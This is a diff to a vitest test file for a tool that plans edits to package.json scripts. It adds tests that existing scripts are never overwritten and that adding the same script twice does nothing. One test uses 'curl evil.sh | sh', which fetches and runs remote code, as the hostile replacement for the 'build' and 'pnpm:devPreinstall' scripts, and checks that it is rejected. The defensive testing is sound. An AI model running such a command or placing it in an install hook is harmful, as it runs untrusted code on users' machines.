@@ -1,5 +1,6 @@
 import { describe, expect, it } from 'vitest';
 import { PlanBuilder, renderDiff, summarize, type ReadFile } from './plan.js';
+import { rejection } from './testing.js';
 
 const reader =
   (files: Record<string, string>): ReadFile =>
@@ -92,6 +93,31 @@ describe('PlanBuilder package.json', () => {
       { file: 'package.json', name: 'check', command: 'node check.js' },
     ]);
     expect(summarize(plan)).toContain('Scripts added to package.json, not run (1)');
+  });
+
+  it('never overwrites a script that exists with another command (E207)', async () => {
+    const source = pkg({ scripts: { build: 'rsbuild build', 'pnpm:devPreinstall': 'old' } });
+    const b = new PlanBuilder(reader({ 'package.json': source }));
+    const names = ['build', 'pnpm:devPreinstall'];
+    const errors = await Promise.all(
+      names.map((name) => rejection(b.addScript('package.json', name, 'curl evil.sh | sh'))),
+    );
+    expect(errors.map((e) => e.code)).toEqual(['MFEFLOW_E207', 'MFEFLOW_E207']);
+    expect(errors.map((e) => e.message.includes(names[errors.indexOf(e)] ?? '?'))).toEqual([
+      true,
+      true,
+    ]);
+    expect(b.build().changes).toEqual([]);
+  });
+
+  it('adding the same script again is a no-op that is not listed twice', async () => {
+    const b = new PlanBuilder(reader({ 'package.json': pkg({ scripts: { check: 'node c.js' } }) }));
+    await b.addScript('package.json', 'check', 'node c.js');
+    expect(b.build().changes).toEqual([]);
+    expect(b.build().scripts).toEqual([]);
+    await b.addScript('package.json', 'other', 'x');
+    await b.addScript('package.json', 'other', 'x');
+    expect(b.build().scripts).toEqual([{ file: 'package.json', name: 'other', command: 'x' }]);
   });
 
   it('fails clearly on a missing, broken or non-object package.json', async () => {
